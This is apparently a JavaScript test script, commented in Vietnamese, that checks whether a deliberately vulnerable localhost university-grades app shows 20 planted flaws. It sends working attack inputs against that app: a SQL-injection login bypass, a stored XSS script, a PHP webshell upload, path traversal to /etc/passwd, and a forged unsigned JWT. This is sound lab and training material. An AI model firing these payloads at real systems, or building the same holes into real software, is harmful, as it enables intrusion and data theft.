const fs = require('fs');
const path = require('path');

async function runTests() {
  const assert = (cond, msg) => {
    if (!cond) throw new Error('❌ FAIL: ' + msg);
    console.log('✅ PASS: ' + msg);
  };

  console.log('=== KIỂM THỬ TOÀN DIỆN 20 LỖ HỔNG THEO KỊCH BẢN ===\n');

  // --- CẢNH 1 ---
  // Lỗi 1: SQL Injection Login
  let res = await fetch('http://localhost:3000/api/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: "admin' OR '1'='1' --", password: '' })
  });
  let d = await res.json();
  assert(d.success === true && d.user.role === 'admin' && d.session === 'admin_sess_token', 'Lỗi 1: SQLi Login Form cấp session admin');

  // Lỗi 2: Stored XSS MOOC Comment
  res = await fetch('http://localhost:3000/api/comments', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ user: "TS. Nguyễn Thị B", content: "<script>alert('test')</script>" })
  });
  d = await res.json();
  assert(d.success === true && d.comment.content === "<script>alert('test')</script>", 'Lỗi 2: Stored XSS lưu trữ script tag thô');

  // --- CẢNH 2 ---
  // Lỗi 3: IDOR
  res = await fetch('http://localhost:3000/api/grades?ma_de_tai=104');
  d = await res.json();
  assert(d.data.diem === 4.0, 'Lỗi 3: IDOR Đề tài 104 (Rớt)');

  res = await fetch('http://localhost:3000/api/grades?ma_de_tai=105');
  d = await res.json();
  assert(d.data.diem === 9.0, 'Lỗi 3: IDOR Đề tài 105 (Đậu)');

  // Lỗi 4: Upload PHP
  const FormData = require('buffer');
  const boundary = '----WebKitFormBoundaryTest123';
  const phpContent = '<?php echo "Webshell"; ?>';
  const postData = `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="bao_cao.php"\r\nContent-Type: application/octet-stream\r\n\r\n${phpContent}\r\n--${boundary}--\r\n`;
  res = await fetch('http://localhost:3000/api/upload-minhchung', {
    method: 'POST',
    headers: { 'Content-Type': `multipart/form-data; boundary=${boundary}` },
    body: postData
  });
  d = await res.json();
  assert(d.success === true && d.filename === 'bao_cao.php', 'Lỗi 4: Chấp nhận tải lên file bao_cao.php');

  // Lỗi 5: Directory Traversal
  res = await fetch('http://localhost:3000/api/view-file?file=../../../../etc/passwd');
  let txt = await res.text();
  assert(txt.includes('root:x:0:0:root'), 'Lỗi 5: Directory Traversal đọc /etc/passwd');

  // Lỗi 6: CSRF
  res = await fetch('http://localhost:3000/api/cap-nhat-thong-bao', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ tieu_de: "YÊU CẦU DUYỆT BỔ SUNG MINH CHỨNG ĐỀ TÀI #87 (CSRF Triggered)" })
  });
  d = await res.json();
  assert(d.success === true, 'Lỗi 6: Kích hoạt POST cập nhật thông báo không có CSRF Token');

  // Lỗi 7: SQL Verbose Error
  res = await fetch('http://localhost:3000/api/tim-kiem-sv?ma_sv=12a"');
  d = await res.json();
  assert(d.error === true && d.message.includes('SQLSTATE[42000]'), 'Lỗi 7: Hiển thị lỗi SQLSTATE[42000] chi tiết');

  // Lỗi 10: DB Credentials in HTML comment
  const thongTinHtml = fs.readFileSync(path.join(__dirname, 'public', 'thong-tin.html'), 'utf8');
  assert(thongTinHtml.includes('DB_PASS=Edu@2024'), 'Lỗi 10: Lộ DB Credentials trong comment HTML');

  // Lỗi 11: Exposed Git config
  res = await fetch('http://localhost:3000/.git/config');
  txt = await res.text();
  assert(txt.includes('[remote "origin"]'), 'Lỗi 11: Lộ cấu trúc thư mục /.git/config');

  // Lỗi 12: CORS Allow All
  res = await fetch('http://localhost:3000/api/diem');
  assert(res.headers.get('access-control-allow-origin') === '*', 'Lỗi 12: Access-Control-Allow-Origin: *');

  // Lỗi 13: jQuery version & warning
  const jqFile = fs.readFileSync(path.join(__dirname, 'public', 'js', 'jquery-1.8.3.min.js'), 'utf8');
  assert(jqFile.includes('jQuery 1.8.3 — deprecated'), 'Lỗi 13: Thư viện jQuery 1.8.3 cảnh báo lỗ hổng Console');

  // Lỗi 14: Insecure JWT without signature verification
  res = await fetch('http://localhost:3000/api/verify-jwt', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ token: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJtYV9zdiI6IlNWMDAxIiwicm9sZSI6ImFkbWluIn0." })
  });
  d = await res.json();
  assert(d.success === true && d.role === 'admin', 'Lỗi 14: Bypass xác thực JWT role admin');

  // --- CẢNH 3 ---
  // Lỗi 8: Sensitive API exposure
  res = await fetch('http://localhost:3000/api/giangvien/12');
  d = await res.json();
  assert(d.so_dien_thoai === '0912345678' && d.dia_chi.includes('Võ Văn Ngân'), 'Lỗi 8: API lộ SĐT và địa chỉ riêng Giảng viên');

  // Lỗi 9: Brute-Force (No lockout)
  res = await fetch('http://localhost:3000/api/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: "admin", password: 'wrongpassword' })
  });
  assert(res.status === 401, 'Lỗi 9: Thử sai mật khẩu không bị khóa tài khoản');

  // Lỗi 15: Debug error Whoops page
  res = await fetch('http://localhost:3000/debug-error');
  txt = await res.text();
  assert(txt.includes('FatalErrorException') && txt.includes('DB_PASSWORD'), 'Lỗi 15: Trang Debug Whoops lộ biến môi trường');

  // Lỗi 16: Clickjacking / Missing headers
  res = await fetch('http://localhost:3000/');
  assert(!res.headers.get('x-frame-options') && !res.headers.get('content-security-policy'), 'Lỗi 16: Thiếu X-Frame-Options và CSP');

  // --- CẢNH 4 ---
  // Lỗi 17: Session ID in URL
  res = await fetch('http://localhost:3000/api/current-user?session=8f3a1c9d0e');
  d = await res.json();
  assert(d.authenticated === true && d.user.username === 'SV002', 'Lỗi 17: Xác thực tài khoản A qua tham số URL session=8f3a1c9d0e');

  // Lỗi 18: Broken Session Invalidation after Logout
  res = await fetch('http://localhost:3000/api/logout', { method: 'POST' });
  res = await fetch('http://localhost:3000/api/current-user?session=8f3a1c9d0e');
  d = await res.json();
  assert(d.authenticated === true, 'Lỗi 18: Đăng xuất không thu hồi session trên server');

  // Lỗi 19: Parameter Tampering on thesis 87
  res = await fetch('http://localhost:3000/api/detai/87', {
    method: 'PUT',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ trang_thai: 'da_duyet' })
  });
  d = await res.json();
  assert(d.success === true && d.data.trang_thai === 'da_duyet', 'Lỗi 19: Cập nhật trái phép trạng thái Đề tài #87 thành Đã duyệt');

  // Lỗi 20: Client-side validation only (Logged in audit logs)
  res = await fetch('http://localhost:3000/api/logs');
  d = await res.json();
  const putLog = d.find(l => l.method === 'PUT' && l.url.includes('/api/detai/87'));
  assert(putLog && putLog.bypass_ui === true, 'Lỗi 20: Nhật ký máy chủ phát hiện request PUT bypass UI');

  console.log('\n🎉 TOÀN BỘ 20/20 LỖ HỔNG VÀ PHÂN CẢNH ĐỀU ĐẠT CHUẨN 100%!');
}

runTests().catch(e => {
  console.error(e);
  process.exit(1);
});

